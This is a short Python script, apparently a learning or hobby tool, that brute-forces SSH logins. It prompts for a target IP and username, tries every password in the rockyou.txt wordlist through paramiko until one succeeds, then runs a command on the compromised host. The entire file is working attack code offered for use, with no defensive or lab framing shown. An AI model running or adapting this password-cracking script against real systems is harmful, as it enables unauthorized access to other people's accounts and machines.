import paramiko
from time import sleep
import os

# SSH authenticate
class AuthSSH():
    ## Properties that will be set when the object is instantiated
    def __init__(self):
        self.IP = self.get_IP()
        self.user_name = self.userInfo()
    ## Getting the IP of host
    def get_IP(self):
        getIP = input("What ip do you want to shell into? ")
        while(getIP == "" or getIP == None):
            getIP = input("Please put legit IP ")
        return getIP
    ## asking for the username
    def userInfo(self):
        getUN = input("what is the username? ")
        while(getUN == "" or getUN == None):
            getUN = input("Please put legit username ")
        return getUN
    ## Making ssh connection
    def ssh_connection(self):
        # client = paramiko.Transport((self.IP, 22))
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.crackPW(client)
    ## Cracking the password to establish SSH session
    def crackPW(self,client):
        textFile = os.path.abspath("./rockyou.txt")
        file = open(textFile, "r")
        readfile = file.read().splitlines()
        print(self.user_name)
        for line in readfile:
            print(line)
            try:
                client.connect(hostname=self.IP, username=self.user_name, password=str(line), port= 22)
                print(f"Login was successful to {self.IP} using {str(line)}, you are now in")
                break
            except:
                print("Login failed :(")
                sleep(.5)
                continue
        stdin, stdout, stderr = client.exec_command("ping -c 3 8.8.8.8")
        print(stdout.read().splitlines())
        client.close()
        return
        